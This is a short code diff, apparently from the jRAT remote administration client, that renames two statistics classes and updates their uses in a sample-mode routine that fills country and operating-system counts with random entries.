@@ -3,8 +3,8 @@ package se.jrat.client;
 import java.util.Random;
 
 import se.jrat.client.net.ConnectionHandler;
-import se.jrat.client.settings.CountryStatistics;
-import se.jrat.client.settings.OperatingSystemStatistics;
+import se.jrat.client.settings.StatisticsCountry;
+import se.jrat.client.settings.StatisticsOperatingSystem;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.utils.NetUtils;
 import se.jrat.client.utils.Utils;
@@ -43,8 +43,8 @@ public class SampleMode {
 		if (stats) {
 			int howMany = new Random().nextInt(100);
 			for (int s = 0; s < howMany; s++) {
-				CountryStatistics.getGlobal().add(slave);
-				OperatingSystemStatistics.getGlobal().add(slave);
+				StatisticsCountry.getGlobal().add(slave);
+				StatisticsOperatingSystem.getGlobal().add(slave);
 			}
 		} else {
 			ConnectionHandler.addSlave(slave);
